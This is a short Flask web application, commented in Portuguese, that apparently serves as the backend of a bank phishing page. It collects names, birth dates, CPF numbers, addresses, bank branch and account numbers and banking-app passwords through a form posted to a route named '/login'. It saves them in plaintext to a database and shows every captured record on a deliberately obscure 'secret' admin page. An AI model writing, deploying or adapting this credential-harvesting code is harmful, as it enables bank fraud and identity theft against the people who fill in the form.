from flask import Flask, render_template, request, redirect, url_for
import sqlite3
import os

app = Flask(__name__)

# Configuração do Banco de Dados com os novos campos
def init_db():
    conn = sqlite3.connect('dados_bancarios.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS usuarios (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nome TEXT, data_nasc TEXT, cpf TEXT,
            cep TEXT, rua TEXT, numero TEXT,
            agencia TEXT, conta TEXT, senha_app TEXT
        )
    ''')
    conn.commit()
    conn.close()

@app.route('/')
def index():
    return render_template('cadastro.html')

# Rota para salvar os dados do formulário de 3 passos
@app.route('/login', methods=['POST'])
def login():
    # Coletando todos os campos do formulário
    dados = (
        request.form.get('nome'), request.form.get('data_nasc'), request.form.get('cpf'),
        request.form.get('cep'), request.form.get('rua'), request.form.get('numero'),
        request.form.get('agencia'), request.form.get('conta'), request.form.get('senha_app')
    )
    
    conn = sqlite3.connect('dados_bancarios.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO usuarios (nome, data_nasc, cpf, cep, rua, numero, agencia, conta, senha_app)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', dados)
    conn.commit()
    conn.close()
    
    # Após salvar, envia para o Dashboard do usuário
    return redirect(url_for('dashboard'))

@app.route('/dashboard')
def dashboard():
    return render_template('index.html')

# --- PAINEL DO ADMINISTRADOR ---
@app.route('/admin_painel_secreto_99') # Link difícil para ninguém achar
def admin():
    conn = sqlite3.connect('dados_bancarios.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM usuarios ORDER BY id DESC')
    usuarios = cursor.fetchall()
    conn.close()
    return render_template('admin.html', usuarios=usuarios)

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)



